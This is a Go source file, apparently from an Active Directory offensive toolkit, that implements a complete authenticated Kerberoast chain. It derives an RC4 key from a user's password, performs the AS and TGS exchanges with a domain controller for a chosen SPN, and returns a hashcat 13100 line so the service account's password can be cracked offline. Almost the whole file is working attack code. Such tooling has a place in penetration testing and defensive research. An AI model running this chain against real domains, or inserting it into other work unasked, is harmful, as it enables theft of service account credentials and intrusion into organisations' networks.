package adgo

import (
	"context"
	"errors"
	"fmt"
	"time"
)

// The authenticated Kerberoast chain, top-level. Given a domain user with
// valid credentials and a target SPN, this returns the hashcat 13100 line
// for the service ticket — the crackable blob encrypted with the SPN
// owner's password.
//
// Steps:
//   1. Derive RC4-HMAC long-term key from the requester's password (NT hash)
//   2. Build AS-REQ with PA-ENC-TIMESTAMP padata
//   3. Send to the DC, receive AS-REP
//   4. Decrypt the AS-REP's enc-part with the requester's key
//   5. Extract the session key + ticket from the decrypted EncASRepPart
//   6. Build AP-REQ (authenticator signed with session key)
//   7. Build TGS-REQ for the target SPN
//   8. Send to the DC, receive TGS-REP
//   9. Extract the enc-part → hashcat 13100 line

// KerbAuthOptions controls the authenticated Kerberoast.
type KerbAuthOptions struct {
	DC        string        // domain controller IP
	Port      int           // 88 default
	Domain    string        // CORP.LOCAL
	Username  string        // requester's username (has valid password)
	Password  string        // requester's password
	TargetSPN string        // SPN to request (Service/host)
	Timeout   time.Duration // per request
}

// KerbAuthResult is the outcome.
type KerbAuthResult struct {
	Requester    string // the user who authenticated
	TargetSPN    string
	Realm        string
	HashcatLine  string
	EncPart      []byte
	SessionKey   []byte // the SPN's encrypted session key (the crack target)
	SessionEType int32
}

// KerberoastChain runs the full authenticated Kerberoast. Returns the
// hashcat line for the SPN's encrypted session key.
func KerberoastChain(ctx context.Context, opts KerbAuthOptions) (*KerbAuthResult, error) {
	if opts.DC == "" {
		return nil, errors.New("adgo: DC required")
	}
	if opts.Domain == "" {
		return nil, errors.New("adgo: domain required")
	}
	if opts.Username == "" {
		return nil, errors.New("adgo: username required")
	}
	if opts.Password == "" {
		return nil, errors.New("adgo: password required")
	}
	if opts.TargetSPN == "" {
		return nil, errors.New("adgo: target SPN required")
	}
	if opts.Port == 0 {
		opts.Port = 88
	}
	if opts.Timeout == 0 {
		opts.Timeout = 5 * time.Second
	}

	// 1. derive the requester's RC4-HMAC key
	ntHash, err := DeriveRC4Key(opts.Password)
	if err != nil {
		return nil, fmt.Errorf("adgo: derive key: %w", err)
	}

	// 2. build the authenticated AS-REQ
	pad := PAEncTimestamp{KerbKeyBytes: ntHash, EType: ETypeRC4_HMAC}
	padata, err := pad.Marshal()
	if err != nil {
		return nil, fmt.Errorf("adgo: padata: %w", err)
	}
	asReq, err := BuildASREQWithPadata(ASREQOptions{
		Realm:    opts.Domain,
		Username: opts.Username,
	}, padata)
	if err != nil {
		return nil, fmt.Errorf("adgo: AS-REQ: %w", err)
	}

	// 3. send to the DC
	asRepBytes, err := kerbSend(ctx, opts.DC, opts.Port, asReq, opts.Timeout)
	if err != nil {
		return nil, fmt.Errorf("adgo: AS-REQ send: %w", err)
	}
	asRep, err := ParseASREP(asRepBytes)
	if err != nil {
		return nil, fmt.Errorf("adgo: AS-REP parse: %w", err)
	}

	// 4. decrypt the AS-REP enc-part
	plainEncASRep, err := DecryptASRepPart(ntHash, asRep.EncPart, asRep.EType)
	if err != nil {
		return nil, fmt.Errorf("adgo: AS-REP decrypt: %w", err)
	}

	// 5. parse the EncASRepPart for session key + ticket
	// The TGT is a Ticket structure — we need the raw DER to embed in the
	// AP-REQ. The AS-REP's ticket field is a [5] element containing the
	// Ticket. ParseASREP already has the raw response; extract the ticket.
	ticketDER, err := extractTicketFromASREP(asRep.Raw)
	if err != nil {
		return nil, fmt.Errorf("adgo: ticket extract: %w", err)
	}
	encPart, err := ParseEncASRepPart(plainEncASRep)
	if err != nil {
		return nil, fmt.Errorf("adgo: EncASRepPart parse: %w", err)
	}
	if len(encPart.SessionKeyBytes) == 0 {
		return nil, errors.New("adgo: session key not found in AS-REP")
	}

	// 6. build AP-REQ for the TGS
	apReq, err := BuildAPReq(APReqOptions{
		Realm:        opts.Domain,
		ClientName:   []string{opts.Username},
		SessionKey:   encPart.SessionKeyBytes,
		SessionEType: encPart.SessionKeyType,
		Ticket:       ticketDER,
	})
	if err != nil {
		return nil, fmt.Errorf("adgo: AP-REQ: %w", err)
	}

	// 7. build TGS-REQ
	tgsReq, err := BuildTGSReq(TGSReqOptions{
		Realm:      opts.Domain,
		ClientName: []string{opts.Username},
		SPNFull:    opts.TargetSPN,
	}, apReq)
	if err != nil {
		return nil, fmt.Errorf("adgo: TGS-REQ: %w", err)
	}

	// 8. send to the DC
	tgsRepBytes, err := kerbSend(ctx, opts.DC, opts.Port, tgsReq, opts.Timeout)
	if err != nil {
		return nil, fmt.Errorf("adgo: TGS-REQ send: %w", err)
	}

	// 9. extract the enc-part from the TGS-REP → hashcat line
	hashLine, enc, err := ExtractKerberoastFromTGS(
		opts.Username, opts.Domain, opts.TargetSPN, tgsRepBytes, int(encPart.SessionKeyType))
	if err != nil {
		return nil, fmt.Errorf("adgo: TGS-REP extract: %w", err)
	}

	return &KerbAuthResult{
		Requester:    opts.Username,
		TargetSPN:    opts.TargetSPN,
		Realm:        opts.Domain,
		HashcatLine:  hashLine,
		EncPart:      enc,
		SessionKey:   encPart.SessionKeyBytes,
		SessionEType: encPart.SessionKeyType,
	}, nil
}

// extractTicketFromASREP pulls the DER-encoded Ticket out of the AS-REP.
//
//	KDC-REP ::= SEQUENCE {
//	    pvno     [0],
//	    msg-type [1],
//	    padata   [2] OPTIONAL,
//	    crealm   [3],
//	    cname    [4],
//	    ticket   [5] Ticket,
//	    enc-part [6] EncryptedData
//	}
//
// We need the raw DER of the [5] element's content (the Ticket structure).
func extractTicketFromASREP(b []byte) ([]byte, error) {
	r := NewDERReader(b)
	tag, content, err := r.ReadTLV()
	if err != nil {
		return nil, err
	}
	if TagClass(tag) != ClassApplication || TagNumber(tag) != 11 {
		return nil, fmt.Errorf("adgo: not an AS-REP (tag 0x%02x)", tag)
	}
	rr := NewDERReader(content)
	_, inner, err := rr.ReadTLV()
	if err != nil {
		return nil, err
	}
	ir := NewDERReader(inner)
	for {
		ft, fc, err := ir.ReadTLV()
		if err != nil {
			break
		}
		if TagNumber(ft) == 5 {
			// return the raw TLV of the ticket field
			return append(append([]byte{}, ft), append(Len(len(fc)), fc...)...), nil
		}
	}
	return nil, errors.New("adgo: no ticket field in AS-REP")
}
